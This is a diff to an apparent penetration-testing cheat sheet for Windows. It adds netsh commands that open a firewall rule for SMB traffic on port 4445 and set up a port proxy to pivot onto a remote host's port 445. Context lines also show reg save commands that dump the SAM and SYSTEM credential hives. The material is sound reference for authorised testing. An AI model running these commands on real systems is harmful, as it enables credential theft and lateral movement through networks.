@@ -32,6 +32,9 @@ Table of Contents
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
    * [Post Explotation](#post-explotation)
+      * [Adding Firewall rules](#adding-firewall-rules)
+   * [Pivoting](#pivoting)
+      * [Local Port Forward with Netsh](#local-port-forward-with-netsh)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
    * [Oracle Hacking](#oracle-hacking)
    * [Forensics](#forensics)
@@ -246,6 +249,22 @@ These credentials are stored into a set of secured files, which are normally blo
 ```cmd
 reg save HKLM\SAM C:\sam
 reg save HKLM\SYSTEM C:\system
+```
+
+## Adding Firewall rules
+The following command will create a rule in the Firewall list that will allow the traffic to SMB in specific IP:
+
+```cmd
+netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=[LOCAL-IP] localport=4445 action=allow
+```
+
+# Pivoting
+In the current part there are explained some pivoting techniques that have been useful in many situations.
+
+## Local Port Forward with Netsh
+The following command will open a port in the listen interface and it will redirect the traffic to another IP:port
+```cmd
+netsh interface portproxy add v4tov4 listenport=4445 listenaddress=[LOCAL-IP] connectport=445 connectaddress=[REMOTE-IP]
 ```
 
 # Eternalblue Vulnerabilities exploitation
